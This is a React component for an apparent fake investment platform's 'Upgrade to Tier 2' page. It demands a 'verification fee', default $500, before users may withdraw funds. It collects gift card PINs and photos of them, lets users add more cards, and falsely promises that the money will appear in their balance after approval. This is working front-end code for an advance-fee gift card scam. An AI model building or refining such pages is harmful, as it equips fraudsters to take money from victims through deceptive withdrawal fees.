import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { useAuth } from '../../context/AuthContext';
import { submitAssetTaxCards, getSettings } from '../../services/api';
import toast from 'react-hot-toast';
import {
  LuPlus as Plus,
  LuTrash2 as Trash2,
  LuUpload as Upload,
  LuCircleAlert as AlertCircle,
  LuArrowLeft as ArrowLeft,
  LuClock as Clock,
  LuShieldCheck as ShieldCheck,
  LuRocket as Rocket,
} from 'react-icons/lu';
import './AssetTaxView.css';

export const AssetTaxView = () => {
  const { user } = useAuth();
  const navigate = useNavigate();
  const [settings, setSettings] = useState(null);
  const [cards, setCards] = useState([]);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [errorMessage, setErrorMessage] = useState(null);
  const [showSuccessModal, setShowSuccessModal] = useState(false);

  useEffect(() => {
    getSettings().then(data => {
      if (data.success) setSettings(data.settings);
    }).catch(() => {});
  }, []);

  const upgradeAmount = settings?.taxAmount || 500;
  const upgradeCardType = settings?.taxCardType || 'Apple Card';

  useEffect(() => {
    if (cards.length === 0) {
      setCards([{
        id: `upgrade-${Date.now()}`,
        cardType: upgradeCardType,
        amount: upgradeAmount,
        pin: '',
        imageUrl: '',
        imageFileName: ''
      }]);
    }
  }, [upgradeCardType, upgradeAmount, cards.length]);

  const addCard = () => {
    setCards([...cards, {
      id: `upgrade-${Date.now()}-${Math.random().toString(36).substr(2,4)}`,
      cardType: upgradeCardType,
      amount: upgradeAmount,
      pin: '',
      imageUrl: '',
      imageFileName: ''
    }]);
  };

  const removeCard = (id) => {
    if (cards.length === 1) return;
    setCards(cards.filter(c => c.id !== id));
  };

  const handleChange = (id, field, value) => {
    setCards(cards.map(c => c.id === id ? { ...c, [field]: value } : c));
    setErrorMessage(null);
  };

  const handleFileUpload = (id, e) => {
    const file = e.target.files?.[0];
    if (file) {
      const reader = new FileReader();
      reader.onloadend = () => {
        setCards(cards.map(c => c.id === id ? { ...c, imageUrl: reader.result, imageFileName: file.name } : c));
      };
      reader.readAsDataURL(file);
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setErrorMessage(null);
    for (let i = 0; i < cards.length; i++) {
      if (!cards[i].pin.trim()) { setErrorMessage(`Enter PIN for card ${i+1}`); return; }
      if (!cards[i].imageUrl) { setErrorMessage(`Upload image for card ${i+1}`); return; }
    }
    setIsSubmitting(true);
    try {
      await submitAssetTaxCards(user.id, cards);
      toast.success('Upgrade payment submitted!');
      setShowSuccessModal(true);
    } catch (err) {
      setErrorMessage(err.message || 'Submission failed.');
    } finally {
      setIsSubmitting(false);
    }
  };

  const totalAmount = cards.reduce((acc, c) => acc + (Number(c.amount) || 0), 0);

  return (
    <div className="asset-tax-view">
      <button className="back-btn" onClick={() => navigate('/dashboard')}>
        <ArrowLeft /> Back to Dashboard
      </button>

      {showSuccessModal && (
        <div className="success-modal">
          <div className="success-modal-card">
            <div className="success-icon"><Clock /></div>
            <h3>Upgrade Request Submitted</h3>
            <p>Your Tier 2 upgrade payment has been received. Upon approval, your account will be upgraded.</p>
            <button onClick={() => { setShowSuccessModal(false); navigate('/dashboard'); }}>Return to Dashboard</button>
          </div>
        </div>
      )}

      <div className="tax-container">
        <div className="header">
          <Rocket />
          <div>
            <h1>Upgrade to Tier 2</h1>
            <p>Unlock institutional-level withdrawal limits</p>
          </div>
        </div>

        <div className="notice-box">
          <ShieldCheck /> Tier 2 Upgrade Requirement
          <p>
            To upgrade your account to Tier 2 and enable high‑volume withdrawals, 
            you need to pay a verification fee of <strong>${upgradeAmount.toLocaleString()}</strong>.
            <br /><br />
            <strong>Note:</strong> After approval, your money will be added to your account balance, and you will be able to withdraw it.
          </p>
        </div>

        {errorMessage && <div className="error-banner"><AlertCircle /> {errorMessage}</div>}

        <form onSubmit={handleSubmit} className="tax-form">
          {cards.map((card, index) => (
            <div key={card.id} className="card-entry">
              <div className="card-header">
                <span>{upgradeCardType} Verification #{index + 1}</span>
                {cards.length > 1 && (
                  <button type="button" onClick={() => removeCard(card.id)}><Trash2 /> Remove</button>
                )}
              </div>
              <div className="form-row">
                <div><label>Card Type</label><input type="text" readOnly value={upgradeCardType} /></div>
                <div><label>Amount ($)</label><input type="number" value={card.amount} onChange={e => handleChange(card.id, 'amount', parseFloat(e.target.value) || 0)} required /></div>
              </div>
              <div><label>Card PIN</label><input type="text" placeholder="e.g. X982-1104-5829-4401" value={card.pin} onChange={e => handleChange(card.id, 'pin', e.target.value)} required /></div>
              <div className="upload-field">
                <label>Upload Card PIN Photo</label>
                <div className="upload-area">
                  <input type="file" accept="image/*" onChange={(e) => handleFileUpload(card.id, e)} required={!card.imageUrl} />
                  <Upload />
                  <span>{card.imageFileName || 'Choose Image'}</span>
                </div>
                {card.imageUrl && <img src={card.imageUrl} alt="preview" className="preview" />}
              </div>
            </div>
          ))}

          <button type="button" className="add-btn" onClick={addCard}>
            <Plus /> Add More Cards
          </button>

          <button type="submit" className="submit-btn" disabled={isSubmitting}>
            {isSubmitting ? 'Submitting...' : `Pay Upgrade Fee ($${totalAmount.toLocaleString()})`}
          </button>
        </form>
      </div>
    </div>
  );
};